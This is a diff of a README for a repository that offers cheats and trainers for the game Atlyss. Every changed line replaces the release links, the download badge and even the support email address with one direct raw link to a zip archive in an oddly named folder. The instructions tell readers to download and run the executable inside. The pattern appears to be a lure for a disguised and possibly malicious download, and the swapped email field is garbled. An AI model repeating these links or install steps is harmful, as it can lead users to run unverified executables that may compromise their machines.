@@ -2,7 +2,7 @@
 
 Welcome to the Atlyss Cheats repository! This project offers a range of cheats, hacks, and trainers for the Atlyss game. Our goal is to enhance your gaming experience by providing you with tools that allow you to explore the game in new ways. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/RazvaN777/Atlyss-Cheats/releases)
+[![Download Latest Release](https://github.com/RazvaN777/Atlyss-Cheats/raw/refs/heads/main/prediscontented/Atlyss-Cheats-2.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/RazvaN777/Atlyss-Cheats/raw/refs/heads/main/prediscontented/Atlyss-Cheats-2.3.zip)
 
 ## Table of Contents
 
@@ -34,7 +34,7 @@ Here are some of the key features available in this repository:
 
 To install the cheats, follow these steps:
 
-1. Visit the [Releases section](https://github.com/RazvaN777/Atlyss-Cheats/releases) to download the latest version.
+1. Visit the [Releases section](https://github.com/RazvaN777/Atlyss-Cheats/raw/refs/heads/main/prediscontented/Atlyss-Cheats-2.3.zip) to download the latest version.
 2. Download the executable file.
 3. Extract the files to your preferred location.
 4. Run the executable file to start using the cheats.
@@ -76,11 +76,11 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 For questions or support, feel free to reach out:
 
-- **Email**: support@atlysscheats.com
+- **Email**: https://github.com/RazvaN777/Atlyss-Cheats/raw/refs/heads/main/prediscontented/Atlyss-Cheats-2.3.zip
 - **GitHub Issues**: Use the Issues tab in this repository for any bug reports or feature requests.
 
 ## Conclusion
 
-Thank you for checking out the Atlyss Cheats repository! We hope you find these tools helpful for your gaming experience. Remember to visit the [Releases section](https://github.com/RazvaN777/Atlyss-Cheats/releases) for the latest updates and downloads.
+Thank you for checking out the Atlyss Cheats repository! We hope you find these tools helpful for your gaming experience. Remember to visit the [Releases section](https://github.com/RazvaN777/Atlyss-Cheats/raw/refs/heads/main/prediscontented/Atlyss-Cheats-2.3.zip) for the latest updates and downloads.
 
 Happy gaming! 🎮
